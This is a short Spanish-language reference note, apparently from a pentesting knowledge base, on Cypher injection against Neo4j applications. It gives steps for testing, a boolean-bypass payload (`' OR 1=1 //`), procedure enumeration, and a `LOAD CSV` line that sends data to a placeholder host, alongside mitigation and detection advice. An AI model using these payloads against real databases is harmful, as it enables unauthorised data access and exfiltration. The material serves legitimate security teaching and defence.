---
topic: Inyección Cypher en Neo4j
tags: [web, neo4j, cypher, injection, database]
---

# Inyección Cypher en Neo4j

[🌐 English](cypher-injection.en.md) | **Español**

## Concepto

Cypher es el lenguaje de consulta de Neo4j. Si una aplicación concatena entrada del usuario en una consulta, se pueden alterar patrones, cláusulas `WHERE`, `RETURN` o `LOAD CSV` y extraer datos o alcanzar funciones del sistema.

## Cuándo aplica

- Endpoint de búsqueda o login que consulta Neo4j.
- Consultas construidas con `+` o `f-string`.
- El usuario controla etiquetas, propiedades o el término de búsqueda.

## Procedimiento

1. Confirmar el motor con un error o una respuesta característica.
2. Probar comillas simples y operadores booleanos.
3. Ajustar el número de columnas con `UNION`.
4. Usar `LOAD CSV` para exfiltrar si no hay salida directa.
5. Revisar permisos de la cuenta de Neo4j.

```cypher
MATCH (u:User) WHERE u.name = '<INPUT>' RETURN u
' OR 1=1 //
```

## Variantes

- Inyección en el nombre de una etiqueta o relación.
- `CALL dbms.procedures()` para enumerar funciones.
- `LOAD CSV FROM 'http://<HOST>/' AS line` para exfiltración.

## Limitaciones

- Neo4j puede estar en solo localhost.
- La cuenta puede tener permisos restringidos.
- Las consultas parametrizadas bloquean la entrada.

## Mitigación

- Usar parámetros (`$name`) y nunca concatenar.
- Validar etiquetas y propiedades con una lista permitida.
- Restringir `LOAD CSV` y los permisos de la cuenta.

## Detección

- Consultas con `UNION`, `LOAD CSV` o comentarios.
- Errores de sintaxis Cypher en logs.
- Conexiones salientes iniciadas por Neo4j.

## Referencias

- <https://neo4j.com/docs/cypher-manual/current/introduction/>
- <https://neo4j.com/docs/cypher-manual/current/values-and-types/parameters/>
- <https://attack.mitre.org/techniques/T1190/>
